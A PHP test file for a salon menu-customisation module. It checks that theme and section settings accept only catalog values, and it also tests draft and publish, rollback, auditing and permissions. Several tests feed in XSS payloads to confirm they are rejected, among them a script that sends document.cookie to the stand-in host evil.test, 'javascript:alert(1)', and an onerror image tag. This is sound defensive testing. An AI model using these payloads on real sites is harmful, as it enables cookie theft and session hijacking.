<?php

declare(strict_types=1);

use App\Kernel\Audit\Models\TenantAuditLog;
use App\Kernel\Identity\Models\User;
use App\Kernel\Tenancy\PlatformHosts;
use App\Modules\Menu\Application\MenuPublisher;
use App\Modules\Menu\Domain\MenuPresentation;
use App\Modules\Menu\Domain\MenuVersionStatus;
use App\Modules\Menu\Domain\Models\MenuVersion;
use Illuminate\Auth\Access\AuthorizationException;

/*
|--------------------------------------------------------------------------
| Menu presentation, draft and publish
|--------------------------------------------------------------------------
|
| docs/13-ROADMAP.md Phase 4 §§14–16.
|
| "Highly customizable" and "arbitrary" are different things. Everything a
| center can change is a choice from a code-owned catalog; there is no field
| anywhere that takes HTML, CSS or JavaScript, and that is a security property
| rather than a scope decision — a center-authored script on a guest-accessible
| page is stored XSS against that center's own customers.
|
*/

/**
 * The public menu API as a guest reaches it since Phase 15: on the center's
 * own subdomain, with the same public slug in the path (ADR-076). The old
 * platform-host path with the public key now answers "No center is published
 * at this address".
 */
function mpMenuUrl(array $center): string
{
    $slug = (string) $center['registration']->requested_slug;

    return app(PlatformHosts::class)->centerUrl($slug, '/api/v1/menu/'.$slug);
}

it('accepts a valid presentation and rejects an unknown template', function (): void {
    $valid = MenuPresentation::fromArray([
        'template_key' => 'luxury',
        'theme' => ['primary' => '#123456', 'font' => 'serif'],
        'sections' => [
            ['key' => 'hero', 'visible' => true, 'config' => ['show_logo' => true]],
            ['key' => 'all_services', 'visible' => true, 'config' => ['group_by' => 'category']],
        ],
    ]);

    expect($valid->templateKey)->toBe('luxury')
        ->and($valid->themeValue('primary'))->toBe('#123456')
        ->and($valid->themeValue('font'))->toBe('serif')
        // Unspecified values fall back to the template's own defaults rather
        // than to nothing.
        ->and($valid->themeValue('corners'))->toBe('square');

    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'my-custom-theme',
        'sections' => [['key' => 'hero', 'visible' => true]],
    ]))->toThrow(InvalidArgumentException::class, 'Unknown menu template');
});

it('refuses anything that is not a colour where a colour belongs', function (): void {
    foreach ([
        'javascript:alert(1)',
        '#fff',
        'red',
        'url(https://evil.test/x.png)',
        '#123456; background-image: url(x)',
    ] as $attempt) {
        expect(fn () => MenuPresentation::fromArray([
            'template_key' => 'minimal',
            'theme' => ['primary' => $attempt],
            'sections' => [['key' => 'hero', 'visible' => true]],
        ]))->toThrow(InvalidArgumentException::class, 'six-digit hex colour');
    }
});

it('refuses a theme option that is not in the catalog', function (): void {
    // A free-text font name would be a CSS injection point and a broken render
    // on any device that does not have it.
    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'theme' => ['font' => 'Comic Sans MS'],
        'sections' => [['key' => 'hero', 'visible' => true]],
    ]))->toThrow(InvalidArgumentException::class, 'must be one of');

    // And an unknown KEY is rejected rather than dropped: silently discarding
    // it would make the stored draft differ from what the owner configured.
    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'theme' => ['custom_css' => 'body{display:none}'],
        'sections' => [['key' => 'hero', 'visible' => true]],
    ]))->toThrow(InvalidArgumentException::class, 'is not a theme option');
});

it('has no field anywhere that accepts markup or script', function (): void {
    foreach (['custom_html', 'custom_css', 'custom_js', 'head_script', 'body_html'] as $field) {
        expect(fn () => MenuPresentation::fromArray([
            'template_key' => 'minimal',
            'theme' => [$field => '<script>fetch("https://evil.test?c="+document.cookie)</script>'],
            'sections' => [['key' => 'hero', 'visible' => true]],
        ]))->toThrow(InvalidArgumentException::class);
    }

    // And no section carries one either.
    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'sections' => [['key' => 'hero', 'visible' => true, 'config' => ['html' => '<img onerror=alert(1)>']]],
    ]))->toThrow(InvalidArgumentException::class, 'is not a setting');
});

it('refuses a section for a module that does not exist yet', function (): void {
    // Offers and reviews are absent from the catalog on purpose: a section that
    // renders an empty box promising a feature the center has not bought is
    // worse than its absence, and seeding fake offers to fill it would be
    // inventing business data.
    foreach (['offers', 'reviews', 'booking', 'loyalty'] as $absent) {
        expect(fn () => MenuPresentation::fromArray([
            'template_key' => 'minimal',
            'sections' => [['key' => $absent, 'visible' => true]],
        ]))->toThrow(InvalidArgumentException::class, 'Unknown menu section');
    }
});

it('refuses a duplicated section and an empty section list', function (): void {
    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'sections' => [
            ['key' => 'hero', 'visible' => true],
            ['key' => 'hero', 'visible' => false],
        ],
    ]))->toThrow(InvalidArgumentException::class, 'more than once');

    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'sections' => [],
    ]))->toThrow(InvalidArgumentException::class, 'at least one section');
});

it('validates section configuration against its own allowed settings', function (): void {
    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'sections' => [['key' => 'featured_services', 'visible' => true, 'config' => ['limit' => 500]]],
    ]))->toThrow(InvalidArgumentException::class, 'between 1 and 24');

    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'sections' => [['key' => 'categories', 'visible' => true, 'config' => ['layout' => 'carousel']]],
    ]))->toThrow(InvalidArgumentException::class, 'must be one of');

    // A setting belonging to a DIFFERENT section is refused too.
    expect(fn () => MenuPresentation::fromArray([
        'template_key' => 'minimal',
        'sections' => [['key' => 'hero', 'visible' => true, 'config' => ['limit' => 6]]],
    ]))->toThrow(InvalidArgumentException::class, 'is not a setting of the [hero] section');
});

it('gives a newly provisioned center a published menu', function (): void {
    $center = $this->registerCenter();

    $published = $this->asCenter($center['tenant'], fn (): ?MenuVersion => app(MenuPublisher::class)->published());

    // A 404 on a QR code that has already been printed is not recoverable.
    expect($published)->not->toBeNull()
        ->and($published->status)->toBe(MenuVersionStatus::Published)
        ->and($published->version)->toBe(1);
});

it('keeps a draft invisible to customers until it is published', function (): void {
    $center = $this->registerCenter();
    $owner = $this->ownerOf($center['tenant']);

    $this->asCenter($center['tenant'], function () use ($owner): void {
        $this->seedCatalog();

        app(MenuPublisher::class)->saveDraft([
            'template_key' => 'barber_dark',
            'theme' => ['primary' => '#ff0000'],
            'sections' => [['key' => 'all_services', 'visible' => true, 'config' => []]],
        ], $owner);
    });

    $live = $this->getJson(mpMenuUrl($center))
        ->assertOk()->json('data.presentation');

    // Editing must not change the page a customer is reading right now.
    expect($live['template'])->toBe('minimal')
        ->and($live['theme']['primary'])->not->toBe('#ff0000');
});

it('makes the draft live on publish, and archives what was live', function (): void {
    $center = $this->registerCenter();
    $owner = $this->ownerOf($center['tenant']);

    $this->asCenter($center['tenant'], function () use ($owner): void {
        $this->seedCatalog();

        $publisher = app(MenuPublisher::class);

        $publisher->saveDraft([
            'template_key' => 'barber_dark',
            'theme' => ['accent' => '#ff8800'],
            'sections' => [['key' => 'all_services', 'visible' => true, 'config' => ['group_by' => 'none']]],
        ], $owner);

        $publisher->publish($owner);
    });

    $live = $this->getJson(mpMenuUrl($center))
        ->assertOk()->json('data.presentation');

    expect($live['template'])->toBe('barber_dark')
        ->and($live['theme']['accent'])->toBe('#ff8800');

    $versions = $this->asCenter($center['tenant'], fn (): array => [
        'published' => MenuVersion::query()->published()->count(),
        'archived' => MenuVersion::query()->archived()->count(),
    ]);

    // Exactly one live version at a time; the previous one is kept for rollback.
    expect($versions['published'])->toBe(1)
        ->and($versions['archived'])->toBe(1);
});

it('restores a previous version as a new version, never by rewriting history', function (): void {
    $center = $this->registerCenter();
    $owner = $this->ownerOf($center['tenant']);

    $result = $this->asCenter($center['tenant'], function () use ($owner): array {
        $publisher = app(MenuPublisher::class);

        $original = $publisher->published();

        $publisher->saveDraft([
            'template_key' => 'luxury',
            'sections' => [['key' => 'all_services', 'visible' => true, 'config' => []]],
        ], $owner);

        $publisher->publish($owner);

        $restored = $publisher->rollbackTo($original->refresh(), $owner);

        return [
            'restored' => $restored,
            'original_version' => $original->version,
            'versions' => MenuVersion::query()->orderBy('version')->pluck('version')->all(),
        ];
    });

    // The rollback is itself a new version. "What was live on the 3rd" keeps
    // one answer, and the sequence has no gaps.
    expect($result['restored']->template_key)->toBe('minimal')
        ->and($result['restored']->version)->toBeGreaterThan($result['original_version'])
        ->and($result['versions'])->toBe([1, 2, 3]);

    $live = $this->getJson(mpMenuUrl($center))
        ->assertOk()->json('data.presentation.template');

    expect($live)->toBe('minimal');
});

it('audits a publish and a rollback', function (): void {
    $center = $this->registerCenter();
    $owner = $this->ownerOf($center['tenant']);

    $actions = $this->asCenter($center['tenant'], function () use ($owner): array {
        $publisher = app(MenuPublisher::class);
        $original = $publisher->published();

        $publisher->saveDraft([
            'template_key' => 'modern',
            'sections' => [['key' => 'all_services', 'visible' => true, 'config' => []]],
        ], $owner);

        $publisher->publish($owner);
        $publisher->rollbackTo($original->refresh(), $owner);

        return TenantAuditLog::query()
            ->whereIn('action', ['menu.version.published', 'menu.version.rolled_back'])
            ->pluck('action')->all();
    });

    expect($actions)->toContain('menu.version.published')
        ->and($actions)->toContain('menu.version.rolled_back');
});

it('requires the menu permission to change anything', function (): void {
    $center = $this->registerCenter();

    $this->asCenter($center['tenant'], function (): void {
        /** @var User $staff */
        $staff = User::query()->create([
            'name' => 'Stylist',
            'email' => 'stylist@alpha.test',
            'is_active' => true,
            'is_owner' => false,
            'all_branches' => true,
        ]);

        $staff->forgetPermissionCache();

        expect(fn () => app(MenuPublisher::class)->saveDraft([
            'template_key' => 'luxury',
            'sections' => [['key' => 'hero', 'visible' => true]],
        ], $staff))->toThrow(AuthorizationException::class);

        expect(fn () => app(MenuPublisher::class)->publish($staff))
            ->toThrow(AuthorizationException::class);
    });
});

it('manages the menu through the API and rejects invalid input as 422', function (): void {
    $center = $this->registerCenter();
    $headers = $this->tokenHeaders($this->apiTokenFor($center['tenant']));

    $this->withHeaders($headers)->getJson('/api/v1/tenant/menu')
        ->assertOk()
        ->assertJsonPath('data.published.status', 'published')
        ->assertJsonPath('data.draft.status', 'draft');

    $this->withHeaders($headers)->putJson('/api/v1/tenant/menu/draft', [
        'template_key' => 'modern',
        'theme' => ['primary' => '#0f766e'],
        'sections' => [['key' => 'all_services', 'visible' => true, 'config' => []]],
    ])->assertOk()->assertJsonPath('data.template_key', 'modern');

    // A rejected presentation is a validation failure, not a 500.
    $this->withHeaders($headers)->putJson('/api/v1/tenant/menu/draft', [
        'template_key' => 'modern',
        'theme' => ['primary' => 'javascript:alert(1)'],
        'sections' => [['key' => 'all_services', 'visible' => true, 'config' => []]],
    ])->assertStatus(422)->assertJsonPath('error.code', 'VALIDATION.FAILED');

    $this->withHeaders($headers)->postJson('/api/v1/tenant/menu/publish')
        ->assertOk()
        ->assertJsonPath('data.status', 'published')
        ->assertJsonPath('data.template_key', 'modern');
});

afterEach(function (): void {
    $this->tearDownRegisteredCenters();
});
